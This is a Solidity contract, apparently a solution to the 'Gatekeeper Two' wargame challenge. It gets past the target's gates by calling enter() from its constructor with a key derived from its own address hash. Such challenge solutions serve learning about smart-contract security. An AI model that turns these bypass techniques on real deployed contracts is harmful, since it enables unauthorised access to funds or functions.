// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeper {
    function enter(bytes8) external returns (bool);
}

contract SolveGatekeeperTwo {
    // Events
    event GateEntered(address indexed, bytes8 indexed);

    constructor(address _address) {
        require(_address.code.length > 0, "address isn't a smart contract");
        IGatekeeper gk = IGatekeeper(_address);

        bytes8 _gateKey = ~(bytes8(keccak256(abi.encodePacked(address(this)))));
        bool res = gk.enter(_gateKey);
        if (res) {
            emit GateEntered(tx.origin, _gateKey);
        }
   }
}
